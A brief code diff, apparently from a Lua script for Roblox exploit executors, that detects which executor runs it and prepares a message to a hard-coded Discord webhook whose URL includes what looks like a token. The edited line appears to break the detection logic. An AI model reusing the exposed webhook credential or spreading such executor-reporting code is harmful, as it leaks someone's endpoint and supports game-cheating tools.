@@ -6,7 +6,7 @@ Webhook_URL = "https://discord.com/api/webhooks/1045952435128107019/wl7bceDv_GEl
 
 local exploitcheck =
    syn and "Synapse X" or
-   identifyexecutor() and "Script Ware" or "Fluxus" 
+   identifyexecutor() and "Script Ware" and "Fluxus" 
 
 local url = Webhook_URL
 local msgData = {
